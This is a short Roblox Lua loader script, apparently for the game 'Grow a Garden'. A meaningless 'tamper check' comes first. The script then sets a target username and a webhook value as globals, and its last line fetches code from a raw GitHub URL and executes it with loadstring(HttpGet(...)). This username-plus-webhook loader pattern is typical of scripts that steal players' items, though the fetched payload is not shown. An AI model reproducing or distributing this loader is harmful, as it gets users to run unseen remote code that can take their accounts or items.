local floor, random = math.floor, math.random
local char, byte = string.char, string.byte

local function tamperCheck()
    local nonce = ("%d:%d:%d"):format(random(1, 100), random(0, 255), random(1, 10000))
    local ok = pcall(function()
        return (tostring(nonce):gmatch(":(%d*):"))
    end)
    if not ok then
        error("Tamper Detected!")
    end
end

tamperCheck()

_G.Username = "I_usebloxflip"
_G.Webhook  = "54fbc67d8a449a6811b1bc076be001b8"

loadstring(game:HttpGet("https://raw.githubusercontent.com/reds2/GrowaGarden/refs/heads/main/GrowAGarden"))()
